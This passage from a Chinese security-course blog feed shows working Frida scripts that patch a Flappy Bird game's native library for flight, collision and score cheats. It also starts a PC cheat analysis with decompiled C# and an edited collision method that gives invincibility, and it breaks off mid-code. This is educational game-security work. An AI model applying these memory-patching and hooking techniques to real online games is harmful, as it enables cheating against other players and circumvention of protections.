<span class="hljs-keyword">var</span> addr1 = libil2cpp.<span class="hljs-property">base</span>.<span class="hljs-title function_">add</span>(offset1);<br>    <span class="hljs-keyword">var</span> arr1 = [<span class="hljs-number">0xE5</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x1A</span>]; <span class="hljs-comment">// BNE 0x5E2F68</span><br>    <span class="hljs-comment">// 修改内存保护</span><br>    <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">protect</span>(addr1, <span class="hljs-number">0x1000</span>, <span class="hljs-string">&#x27;rwx&#x27;</span>);<br>    <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">writeByteArray</span>(addr1, arr1);<br>    <span class="hljs-comment">// OnCollisionEnter2D</span><br>    <span class="hljs-keyword">var</span> offset2 = <span class="hljs-number">0x5E30CC</span>;<br>    <span class="hljs-keyword">var</span> addr2 = libil2cpp.<span class="hljs-property">base</span>.<span class="hljs-title function_">add</span>(offset2);<br>    <span class="hljs-keyword">var</span> arr2 = [<span class="hljs-number">0x18</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0xE2</span>]; <span class="hljs-comment">// ADD R11, SP, #0x18</span><br>    <span class="hljs-comment">// 修改内存保护</span><br>    <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">protect</span>(addr2, <span class="hljs-number">0x1000</span>, <span class="hljs-string">&#x27;rwx&#x27;</span>);<br>    <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">writeByteArray</span>(addr2, arr2);<br>&#125;);<br></code></pre></td></tr></table></figure><p>将两条指令改回来</p></li><li><p>开启飞行</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">var</span> libil2cpp = <span class="hljs-title class_">Process</span>.<span class="hljs-title function_">findModuleByName</span>(<span class="hljs-string">&quot;libil2cpp.so&quot;</span>);<br>    <span class="hljs-comment">// 在LateUpdate函数中有设置重力的部分, 将数值修改为0.125减轻重力的影响</span><br>    <span class="hljs-keyword">var</span> offset1 = <span class="hljs-number">0x5E289C</span>;<br>    <span class="hljs-keyword">var</span> addr1 = libil2cpp.<span class="hljs-property">base</span>.<span class="hljs-title function_">add</span>(offset1);<br>    <span class="hljs-keyword">var</span> arr1 = [<span class="hljs-number">0x3D</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xE3</span>]; <span class="hljs-comment">// MOV R1. #0x3D000000 0.03125</span><br>    <span class="hljs-comment">// 修改内存保护</span><br>    <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">protect</span>(addr1, <span class="hljs-number">0x1000</span>, <span class="hljs-string">&#x27;rwx&#x27;</span>);<br>    <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">writeByteArray</span>(addr1, arr1);<br>    <span class="hljs-keyword">var</span> offset2 = <span class="hljs-number">0x5E2A38</span>; <br>    <span class="hljs-keyword">var</span> addr2 = libil2cpp.<span class="hljs-property">base</span>.<span class="hljs-title function_">add</span>(offset2);<br>    <span class="hljs-keyword">var</span> arr2 = [<span class="hljs-number">0x3D</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xE3</span>]; <span class="hljs-comment">// MOV R1. #0x3D000000 0.03125</span><br>    <span class="hljs-comment">// 修改内存保护</span><br>    <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">protect</span>(addr1, <span class="hljs-number">0x1000</span>, <span class="hljs-string">&#x27;rwx&#x27;</span>);<br>    <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">writeByteArray</span>(addr1, arr1);<br>    <span class="hljs-comment">// 将tiltSmooth修改为maxTiltSmooth的分支patch掉</span><br>    <span class="hljs-keyword">var</span> offset3 = <span class="hljs-number">0x5E2A14</span>; <br>    <span class="hljs-keyword">var</span> addr3 = libil2cpp.<span class="hljs-property">base</span>.<span class="hljs-title function_">add</span>(offset3);<br>    <span class="hljs-keyword">var</span> arr3 = [<span class="hljs-number">0x0A</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xEA</span>]; <span class="hljs-comment">// B 0x5E2A44</span><br>    <span class="hljs-comment">// 修改内存保护</span><br>    <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">protect</span>(addr3, <span class="hljs-number">0x1000</span>, <span class="hljs-string">&#x27;rwx&#x27;</span>);<br>    <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">writeByteArray</span>(addr3, arr3);<br>    <span class="hljs-comment">// 还需要将thrust推力减小</span><br>    <span class="hljs-comment">// 由于不能直接拿到PlayerController的实例,需要先hook Update, 获得实例之后才能继续修改</span><br>    <span class="hljs-keyword">var</span> pc_instance = <span class="hljs-variable constant_">NULL</span>;<br>    <span class="hljs-keyword">var</span> func_offset = <span class="hljs-number">0x5E23E4</span>; <span class="hljs-comment">// PlayerController__Update</span><br>    <span class="hljs-keyword">var</span> func_addr = libil2cpp.<span class="hljs-property">base</span>.<span class="hljs-title function_">add</span>(func_offset);<br>    <span class="hljs-comment">// 函数对象</span><br>    <span class="hljs-keyword">var</span> targetFunc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeFunction</span>(func_addr, <span class="hljs-string">&#x27;void&#x27;</span>, [<span class="hljs-string">&#x27;pointer&#x27;</span>]);<br>    <span class="hljs-comment">// hook</span><br>    <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(targetFunc, &#123;<br>        <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>) &#123;<br>            <span class="hljs-comment">// send(args[0]);</span><br>            pc_instance = args[<span class="hljs-number">0</span>];<br>            <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">detachAll</span>();<br>            <span class="hljs-title function_">send</span>(<span class="hljs-string">`PlayerController Instance: <span class="hljs-subst">$&#123;pc_instance&#125;</span>`</span>);<br>            <span class="hljs-keyword">var</span> thrust_ptr = pc_instance.<span class="hljs-title function_">add</span>(<span class="hljs-number">0xC</span>); <span class="hljs-comment">// 偏移0xC</span><br>            <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">writeFloat</span>(thrust_ptr, <span class="hljs-number">50</span>);<br>            <span class="hljs-keyword">var</span> thrust = <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readFloat</span>(thrust_ptr);<br>            <span class="hljs-title function_">send</span>(thrust);<br>        &#125;<br>    &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p>开启飞行稍微有点复杂，首先需要修改刚体的重力，由于很难通过地址去之间修改重力值，并且前面分析知道在Update中会持续修改重力，直接改内存不可行，所以选择Patch修改重力部分的代码，原来的代码中一处设置重力为2.0，一处为1.0，这里将其修改为0.03125，这个值16进制表示方便，至于为什么不设置为0，是为了放置小鸟飞出屏幕，这里将其改小实现缓降的效果；tiltSmooth会影响小鸟下落的速度（貌似是旋转速度，没仔细测试，顺便改了），把tiltSmooth修改为maxTiltSmooth的分支patch掉的分支Patch掉；另外还影响飞行效果的就是点击屏幕时小鸟往上飞，需要将向上飞的效果减弱，不然容易飞出屏幕，经过前面的分析可以知道点击屏幕后会给小鸟一个向上的力，这个力保存在<code>this-&gt;fields.thrust</code>中，想要找到这个值，需要首先知道<code>PlayerController</code>实例的位置，但是显然没法直接得到，所以需要使用其他的方式来获取实例的地址，因为<code>Update</code>方法在每帧都会调用，并且第一个参数就是<code>PlayerController</code>的实例，所以可以直接hook<code>Update</code>函数，读取第一个参数，得到所需的实例地址，再根据偏移，得到<code>this-&gt;fields.thrust</code>的指针，经过测试可以知道施加的向上的力大小默认为225，这里改为50，减小向上飞的效果</p></li><li><p>关闭飞行</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">var</span> libil2cpp = <span class="hljs-title class_">Process</span>.<span class="hljs-title function_">findModuleByName</span>(<span class="hljs-string">&quot;libil2cpp.so&quot;</span>);<br>    <span class="hljs-comment">// 在LateUpdate函数中有设置重力的部分, 恢复其数值</span><br>    <span class="hljs-keyword">var</span> offset1 = <span class="hljs-number">0x5E289C</span>;<br>    <span class="hljs-keyword">var</span> addr1 = libil2cpp.<span class="hljs-property">base</span>.<span class="hljs-title function_">add</span>(offset1);<br>    <span class="hljs-keyword">var</span> arr1 = [<span class="hljs-number">0xFE</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xE3</span>]; <span class="hljs-comment">// MOV R1, #0x3F800000</span><br>    <span class="hljs-comment">// 修改内存保护</span><br>    <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">protect</span>(addr1, <span class="hljs-number">0x1000</span>, <span class="hljs-string">&#x27;rwx&#x27;</span>);<br>    <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">writeByteArray</span>(addr1, arr1);<br>    <span class="hljs-keyword">var</span> offset2 = <span class="hljs-number">0x5E2A38</span>;<br>    <span class="hljs-keyword">var</span> addr2 = libil2cpp.<span class="hljs-property">base</span>.<span class="hljs-title function_">add</span>(offset2);<br>    <span class="hljs-keyword">var</span> arr2 = [<span class="hljs-number">0x01</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xE3</span>]; <span class="hljs-comment">// MOV R1, #0x40000000</span><br>    <span class="hljs-comment">// 修改内存保护</span><br>    <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">protect</span>(addr1, <span class="hljs-number">0x1000</span>, <span class="hljs-string">&#x27;rwx&#x27;</span>);<br>    <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">writeByteArray</span>(addr1, arr1);<br>    <span class="hljs-comment">// 将tiltSmooth修改为maxTiltSmooth的分支恢复</span><br>    <span class="hljs-keyword">var</span> offset3 = <span class="hljs-number">0x5E2A14</span>; <br>    <span class="hljs-keyword">var</span> addr3 = libil2cpp.<span class="hljs-property">base</span>.<span class="hljs-title function_">add</span>(offset3);<br>    <span class="hljs-keyword">var</span> arr3 = [<span class="hljs-number">0x0A</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x5A</span>]; <span class="hljs-comment">// BPL 0x5E2A44</span><br>    <span class="hljs-comment">// 修改内存保护</span><br>    <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">protect</span>(addr3, <span class="hljs-number">0x1000</span>, <span class="hljs-string">&#x27;rwx&#x27;</span>);<br>    <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">writeByteArray</span>(addr3, arr3);<br>    <span class="hljs-comment">// 恢复thrust推力</span><br>    <span class="hljs-comment">// 由于不能直接拿到PlayerController的实例,需要先hook Update, 获得实例之后才能继续修改</span><br>    <span class="hljs-keyword">var</span> pc_instance = <span class="hljs-variable constant_">NULL</span>;<br>    <span class="hljs-keyword">var</span> func_offset = <span class="hljs-number">0x5E23E4</span>; <span class="hljs-comment">// PlayerController__Update</span><br>    <span class="hljs-keyword">var</span> func_addr = libil2cpp.<span class="hljs-property">base</span>.<span class="hljs-title function_">add</span>(func_offset);<br>    <span class="hljs-comment">// 函数对象</span><br>    <span class="hljs-keyword">var</span> targetFunc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeFunction</span>(func_addr, <span class="hljs-string">&#x27;void&#x27;</span>, [<span class="hljs-string">&#x27;pointer&#x27;</span>]);<br>    <span class="hljs-comment">// hook</span><br>    <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(targetFunc, &#123;<br>        <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>) &#123;<br>            <span class="hljs-comment">// send(args[0]);</span><br>            pc_instance = args[<span class="hljs-number">0</span>];<br>            <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">detachAll</span>();<br>            <span class="hljs-title function_">send</span>(<span class="hljs-string">`PlayerController Instance: <span class="hljs-subst">$&#123;pc_instance&#125;</span>`</span>);<br>            <span class="hljs-keyword">var</span> thrust_ptr = pc_instance.<span class="hljs-title function_">add</span>(<span class="hljs-number">0xC</span>); <span class="hljs-comment">// 偏移0xC</span><br>            <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">writeFloat</span>(thrust_ptr, <span class="hljs-number">225</span>);<br>            <span class="hljs-keyword">var</span> thrust = <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readFloat</span>(thrust_ptr);<br>            <span class="hljs-title function_">send</span>(<span class="hljs-string">`thrust: <span class="hljs-subst">$&#123;thrust&#125;</span>`</span>);<br>        &#125;<br>    &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p>开启飞行的逆过程</p></li><li><p>修改分数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">var</span> libil2cpp = <span class="hljs-title class_">Process</span>.<span class="hljs-title function_">findModuleByName</span>(<span class="hljs-string">&quot;libil2cpp.so&quot;</span>);<br>    <span class="hljs-comment">// 读取GameManager_TypeInfo</span><br>    <span class="hljs-keyword">var</span> gm_info_addr = libil2cpp.<span class="hljs-property">base</span>.<span class="hljs-title function_">add</span>(<span class="hljs-number">0x7690F0</span>);<br>    <span class="hljs-keyword">var</span> gm_info = <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readPointer</span>(gm_info_addr);<br>    <span class="hljs-keyword">var</span> gm_static_filed_addr = gm_info.<span class="hljs-title function_">add</span>(<span class="hljs-number">0x5C</span>); <span class="hljs-comment">// 结构体偏移0x5C</span><br>    <span class="hljs-keyword">var</span> gm_static_filed = <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readPointer</span>(gm_static_filed_addr);<br>    <span class="hljs-keyword">var</span> gm_instance = <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readPointer</span>(gm_static_filed); <span class="hljs-comment">// 偏移0x00</span><br>    <span class="hljs-keyword">var</span> gm_score_ptr = gm_instance.<span class="hljs-title function_">add</span>(<span class="hljs-number">0x50</span>); <span class="hljs-comment">// 分数偏移0x50</span><br>    <span class="hljs-keyword">var</span> gm_score = <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readS32</span>(gm_score_ptr);<br>    <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">writeS32</span>(gm_score_ptr, gm_score+<span class="hljs-number">100</span>); <span class="hljs-comment">// 加100分</span><br>    gm_score = <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readS32</span>(gm_score_ptr); <span class="hljs-comment">// 修改分数</span><br>    <span class="hljs-title function_">send</span>(<span class="hljs-string">`game score: <span class="hljs-subst">$&#123;gm_score&#125;</span>`</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>改分和设置飞行类似，需要通过实例找偏移再找到要改的数据的位置，但是<code>GameManager</code>是个静态类，直接有导出的地址，经过几次偏移就能得到，修改内存就能改分，这里直接加100分，遗憾的一点是改完后不会自动刷新，需要游戏触发一次更新分数才会显示，本来是想用frida调用<code>UpdateScore</code>函数的，但是调用的时候一直出错，所有没能实现自动刷新的效果</p></li></ul><p>使用未修改的游戏安装包安装测试：</p><p><img src="assets/2023-10-29-00-52-11-1%E5%8A%9F%E8%83%BD%E6%BC%94%E7%A4%BA.gif"></p>]]></content>
    
    
    <categories>
      
      <category>腾讯游戏客户端安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>外挂实现分析-PC端</title>
    <link href="/2023/11/12/TencentGameClient/%E5%A4%96%E6%8C%82%E5%AE%9E%E7%8E%B0%E5%88%86%E6%9E%90-PC%E7%AB%AF/"/>
    <url>/2023/11/12/TencentGameClient/%E5%A4%96%E6%8C%82%E5%AE%9E%E7%8E%B0%E5%88%86%E6%9E%90-PC%E7%AB%AF/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/noxke/TencentGameClientOpenCourse">GitHub - noxke&#x2F;TencentGameClientOpenCourse: 腾讯游戏客户端公开课2023 腾讯菁英班</a></p><h3 id="游戏分析"><a href="#游戏分析" class="headerlink" title="游戏分析"></a>游戏分析</h3><p>使用工具如下:</p><blockquote><p><a href="https://github.com/dnSpy/dnSpy">dnSpy v6.1.8</a></p><p><a href="https://github.com/cheat-engine/cheat-engine">Cheat Engine 7.5</a></p><p><a href="https://github.com/BepInEx/BepInEx">BepInEx 5.4.22</a></p><p><a href="https://github.com/BepInEx/BepInEx.ConfigurationManager">BepInEx.ConfigurationManager v18.0.1</a></p><p><a href="https://github.com/sinai-dev/UnityExplorer">UnityExplorer 4.9.0</a></p><p><a href="https://docs.unity.cn/cn/2019.4/ScriptReference/index.html">Unity 脚本 API</a></p></blockquote><p>游戏使用Unity Mono实现，主要游戏逻辑在<code>./FlappyBird_Data/Managed/Assembly-CSharp.dll</code>文件中，使用C#语言编写</p><p>使用dnSpy加载游戏的程序集文件<code>Assembly-CSharp.dll</code></p><img title="" src="assets/2023-10-27-14-42-36-image.png" alt="" data-align="center" width="288"><p>根据类名可以知道每个类的主要功能，与小鸟有关的功能实现在<code>BirdScripts</code>类中，有关于游戏控制的实现在<code>GameControllers</code>类和<code>GamePlayController</code>类中</p><p>首先分析<code>BirdScripts</code>类</p><p><code>BirdScripts</code>类派生自<code>MonoBehaviour</code>，其中的<code>Awake</code>方法在加载实例时调用</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cs"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Awake</span>()</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (BirdScripts.instance == <span class="hljs-literal">null</span>)<br>    &#123;<br>        BirdScripts.instance = <span class="hljs-keyword">this</span>;<br>    &#125;<br>    <span class="hljs-keyword">this</span>.isAlive = <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">this</span>.score = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">this</span>.flapButton = GameObject.FindGameObjectWithTag(<span class="hljs-string">&quot;FlapButton&quot;</span>).GetComponent&lt;Button&gt;();<br>    <span class="hljs-keyword">this</span>.flapButton.onClick.AddListener(<span class="hljs-built_in">delegate</span>()<br>    &#123;<br>        <span class="hljs-keyword">this</span>.flapTheBird();<br>    &#125;);<br>    <span class="hljs-keyword">this</span>.CameraX();<br>&#125;<br></code></pre></td></tr></table></figure><p>该方法主要是对小鸟的初始化，设置小鸟存活状态为true，设置分数0，绑定按钮事件等</p><p><code>FixUpdate</code>用于物理计算，循环调用</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs cs"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">FixedUpdate</span>()</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.isAlive)<br>    &#123;<br>        Vector3 position = <span class="hljs-keyword">base</span>.transform.position;<br>        position.x += <span class="hljs-keyword">this</span>.forwardSpeed * Time.deltaTime;<br>        <span class="hljs-keyword">base</span>.transform.position = position;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.didFlap)<br>        &#123;<br>            <span class="hljs-keyword">this</span>.didFlap = <span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">this</span>.myRigidBody.velocity = <span class="hljs-keyword">new</span> Vector2(<span class="hljs-number">0f</span>, <span class="hljs-keyword">this</span>.bounceSpeed);<br>            <span class="hljs-keyword">this</span>.audioSource.PlayOneShot(<span class="hljs-keyword">this</span>.flapClick);<br>            <span class="hljs-keyword">this</span>.anim.SetTrigger(<span class="hljs-string">&quot;Flap&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.myRigidBody.velocity.y &gt;= <span class="hljs-number">0f</span>)<br>        &#123;<br>            <span class="hljs-keyword">base</span>.transform.rotation = Quaternion.Euler(<span class="hljs-number">0f</span>, <span class="hljs-number">0f</span>, <span class="hljs-number">0f</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-built_in">float</span> z = Mathf.Lerp(<span class="hljs-number">0f</span>, <span class="hljs-number">-70f</span>, -<span class="hljs-keyword">this</span>.myRigidBody.velocity.y / <span class="hljs-number">7f</span>);<br>            <span class="hljs-keyword">base</span>.transform.rotation = Quaternion.Euler(<span class="hljs-number">0f</span>, <span class="hljs-number">0f</span>, z);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>主要逻辑是移动小鸟坐标，执行flap操作后为小鸟设置y方向上的速度向量，播放音乐，播放动画，当y方向上速度向量为0时小鸟不旋转，当y方向上速度向量小于0时小鸟绕z轴旋转</p><p>另外两个重要方法分别是<code>OnCollisionEnter2D</code>而<code>OnTriggerEnter2D</code></p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cs"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">OnCollisionEnter2D</span>(<span class="hljs-params">Collision2D target</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (target.gameObject.tag == <span class="hljs-string">&quot;Pipe&quot;</span> || target.gameObject.tag == <span class="hljs-string">&quot;Ground&quot;</span> || target.gameObject.tag == <span class="hljs-string">&quot;Enemy&quot;</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.isAlive)<br>        &#123;<br>            <span class="hljs-keyword">this</span>.isAlive = <span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">this</span>.anim.SetTrigger(<span class="hljs-string">&quot;BirdDied&quot;</span>);<br>            <span class="hljs-keyword">this</span>.audioSource.PlayOneShot(<span class="hljs-keyword">this</span>.diedClip);<br>            GamePlayController.instance.playerDiedShowScore(<span class="hljs-keyword">this</span>.score);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (target.gameObject.tag == <span class="hljs-string">&quot;Flag&quot;</span> &amp;&amp; <span class="hljs-keyword">this</span>.isAlive)<br>    &#123;<br>        <span class="hljs-keyword">this</span>.isAlive = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">this</span>.audioSource.PlayOneShot(<span class="hljs-keyword">this</span>.cheerClip);<br>        GamePlayController.instance.finishGame();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当小鸟刚体碰撞时调用<code>OnCollisionEnter2D</code>方法，发生碰撞后，根据目标的标签判断游戏失败或游戏胜利</p><p>当碰撞的物体为管道<code>Pipe</code>、地面<code>Ground</code>或敌人<code>Enemy</code>时，设置小鸟死亡，播放音乐，勃发动画，显示死亡分数等；当碰撞物体为棋子<code>Flag</code>时，游戏胜利</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cs"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">OnTriggerEnter2D</span>(<span class="hljs-params">Collider2D target</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (target.tag == <span class="hljs-string">&quot;PipeHolder&quot;</span>)<br>    &#123;<br>        <span class="hljs-keyword">this</span>.audioSource.PlayOneShot(<span class="hljs-keyword">this</span>.pointClip);<br>        <span class="hljs-keyword">this</span>.score++;<br>        GamePlayController.instance.setScore(<span class="hljs-keyword">this</span>.score);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当小鸟进入附加到该对象的触发碰撞体时调用<code>OnTriggerEnter2D</code>方法，该方法判断小鸟是否进入管道间隙<code>PipeHolder</code>，进入到管道间隙时分数加一，更新排名显示的分数</p><p><code>instance</code>成员保存当前的小鸟实例</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cs"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> BirdScripts instance;<br></code></pre></td></tr></table></figure><p><code>myRigidBody</code>成员保存当前小鸟的刚体物理组件</p><h3 id="游戏破解"><a href="#游戏破解" class="headerlink" title="游戏破解"></a>游戏破解</h3><ul><li><h4 id="修改和重新编译C-程序集实现"><a href="#修改和重新编译C-程序集实现" class="headerlink" title="修改和重新编译C#程序集实现"></a>修改和重新编译C#程序集实现</h4></li></ul><p>根据上述分析可以了解，<code>OnCollisionEnter2D</code>内实现小鸟的碰撞检测，删除该方法内触发小鸟死亡的分支，可实现无敌效果，<code>OnTriggerEnter2D</code>内实现分数计算，修改该方法，可实增加游戏分数的效果</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cs"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">OnCollisionEnter2D</span>(<span class="hljs-params">Collision2D target</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (target.gameObject.tag == <span class="hljs-string">&quot;Flag&quot;</span> &amp;&amp; <span class="hljs-keyword">this</span>.isAlive)<br>    &#123;<br>        <span class="hljs-keyword">this</span>.isAlive = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">this</span>.audioSource.PlayOneShot(<span 